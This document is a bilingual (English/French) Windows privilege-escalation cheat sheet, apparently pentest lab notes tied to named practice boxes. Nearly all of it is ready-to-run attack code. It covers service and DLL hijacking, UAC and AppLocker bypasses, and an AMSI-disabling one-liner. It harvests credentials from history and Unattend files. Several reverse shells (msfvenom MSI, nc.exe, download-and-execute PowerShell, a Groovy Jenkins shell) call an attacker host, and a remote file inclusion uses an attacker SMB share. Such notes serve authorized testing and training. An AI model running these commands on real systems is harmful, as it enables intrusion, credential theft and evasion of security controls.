## Service-based Privilege Escalation

### Service Binary Hijacking
> Replace a service binary with a malicious one when permissions allow

```powershell
# Check service binaries and permissions
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
icacls "C:\path\to\service.exe"

# Create a malicious service binary
# Compile with: x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

# Replace the binary and restart service
move C:\path\to\service.exe service.exe.bak
move adduser.exe C:\path\to\service.exe
net stop [service_name]
net start [service_name]
# If you can't restart, check if auto-start: shutdown /r /t 0
```

### Unquoted Service Paths
> Services with unquoted paths can be exploited with space traversal

```powershell
# Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

# Create a malicious executable in the path
# Example for path: C:\Program Files\Vulnerable Service\service.exe
# Place malicious binary at: C:\Program Files\Vulnerable.exe
```

### DLL Hijacking
> Replace or add DLLs that are loaded by a service

```powershell
# Find potential DLL hijacking
Process Monitor - filter for "NAME NOT FOUND" and "PATH ENDING .dll"

# Create malicious DLL
# Compile with: x86_64-w64-mingw32-gcc -shared -o hijackme.dll dll_hijack.c

# Place in the correct location and restart service
```

##  UAC Bypass Techniques

### Standard UAC Bypass
> Bypass User Account Control to get elevated privileges

```powershell
# Check current UAC settings
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

# Check Windows build
[environment]::OSVersion.Version

# Use appropriate bypass technique (example using DLL hijacking)
# For Windows 10 build 14393
# 1. Create malicious DLL
# 2. Place in WindowsApps folder
# 3. Execute with trusted binary that auto-elevates
C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

## AlwaysInstallElevated

> If enabled, MSI files can be installed with SYSTEM privileges

```powershell
# Check if enabled (both must be set to 1)
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Create malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker-ip LPORT=4444 -f msi -o malicious.msi

# Generate MSI with PowerUp
Import-Module .\PowerUp.ps1
Write-UserAddMSI

# Install MSI to get SYSTEM
msiexec /quiet /qn /i malicious.msi
```

## Credential Theft
> Various methods to extract credentials from Windows systems

```powershell
# Find passwords in files
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml

# PowerShell history
gc (Get-PSReadLineOption).HistorySavePath
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}

# Stored PowerShell credentials
$credential = Import-Clixml -Path 'C:\path\to\credential.xml'
$credential.GetNetworkCredential().username
$credential.GetNetworkCredential().password

# Unattended installation files
gc C:\Windows\Panther\Unattend.xml
gc C:\Windows\Panther\Unattend\Unattend.xml
gc C:\Windows\System32\sysprep\Unattend.xml

# More techniques coming soon...
```

## Restricted Environments

> Techniques for escaping restricted environments like Citrix, RDP restricted, AppLocker

```powershell
# Bypassing AppLocker
# Check current policy
Get-AppLockerPolicy -Effective | Format-List

# Use alternate execution methods:
# - Regsvr32: regsvr32.exe /s /u /i:test.sct scrobj.dll
# - MSBuild: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe payload.csproj
# - InstallUtil: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe

# More techniques coming soon...
```

## Additional Techniques

> Additional privilege escalation techniques

```powershell
# Scheduled Tasks
schtasks /query /fo LIST /v

# Registry autoruns
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Insecure GUI apps
# Look for apps running as SYSTEM that may have exploitable features

# More techniques coming soon...
```

## Dealing with End of Life Systems

> Targeting outdated systems that are no longer receiving security updates

```powershell
# Identify EOL systems
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

# Common EOL systems:
# - Windows XP/2003: MS17-010 (EternalBlue)
# - Windows 7/2008 R2: Multiple known vulnerabilities
# - Windows 8/2012: Multiple known vulnerabilities

# More techniques coming soon...
```

## Techniques d'élévation de privilèges Windows dans des Box
### Modification des binaires de service
Exemple (Return):
```bash
# Remplacer un binaire de service par un reverse shell
upload /usr/share/windows-resources/binaries/nc.exe
sc.exe config VMTools binPath="C:\path\to\nc.exe -e cmd.exe <IP> <PORT>"
sc.exe stop VMTools
sc.exe start VMTools
```
### Exploitation des services mal configurés
Exemple (Arctic):

```bash
# Identifier les services vulnérables
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"

# Vérifier les permissions sur les binaires de service
icacls "C:\path\to\service.exe"
```
## Restricted Environments
### Contournement des restrictions PowerShell
Exemple (Remote):
```bash
# Exécution de code PowerShell à distance
IEX(IWR http://<IP>:<PORT>/rev.ps1 -UseBasicParsing)

# Contournement d'AMSI
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
### Exploitation des interfaces restreintes
Exemple (Jeeves):
```bash
# Exploitation de la console de script Jenkins
String host="<IP>";
int port=<PORT>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Credential Theft
### Extraction de mots de passe en clair
Exemple (Sniper):
```bash
# Recherche de mots de passe dans les fichiers de configuration
type ..\user\db.php

# Recherche de fichiers sensibles
dir /s /b *pass*.txt *cred* *vnc* *.config*
```
### Exploitation des fichiers de configuration
Exemple (Authority):
```powershell
# Extraction de mots de passe depuis des fichiers de configuration
type C:\path\to\config.xml

# Utilisation d'outils spécialisés pour le cracking
ansible2john ansible_inventory > hash.txt
john hash.txt
```
### Exploitation des flux de données alternatifs (ADS)
Exemple (Jeeves):
```bash
# Lister les flux de données alternatifs
dir /R

# Lire le contenu d'un flux de données alternatif
more < hm.txt:root.txt
```
## Other Stuff
### Exploitation des vulnérabilités d'applications web
#### Exploitation des injections de fichiers à distance (RFI)
Exemple (Sniper):
```bash
# Configuration d'un partage SMB malveillant
mkdir /var/www/html/sniper
chmod 0555 /var/www/html/sniper/
chown -R nobody:nogroup /var/www/html/sniper/

# Exploitation de l'inclusion de fichier à distance
http://<IP>/blog/?lang=\\<ATTACKER_IP>\sniper\box.php
```